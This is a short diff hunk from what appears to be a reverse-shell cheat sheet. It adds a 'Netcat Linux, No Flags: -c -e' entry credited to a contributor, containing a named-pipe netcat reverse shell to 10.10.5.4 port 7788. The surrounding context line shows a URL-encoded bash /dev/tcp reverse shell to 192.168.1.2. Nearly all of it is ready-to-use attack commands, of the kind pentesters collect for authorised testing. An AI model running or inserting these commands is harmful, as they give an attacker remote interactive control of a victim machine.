@@ -113,6 +113,14 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%
 
 # <kbd>Netcat Linux</kbd>
 
+# <kbd>No Flags: -c -e</kbd>
+
+>credits: UnD3sc0n0c1d0
+
+```cmd
+/bin/sh 0</tmp/backpipe | nc 10.10.5.4 7788 1>/tmp/backpipe
+```
+
 # <kbd>-e</kbd>
 
 ```cmd
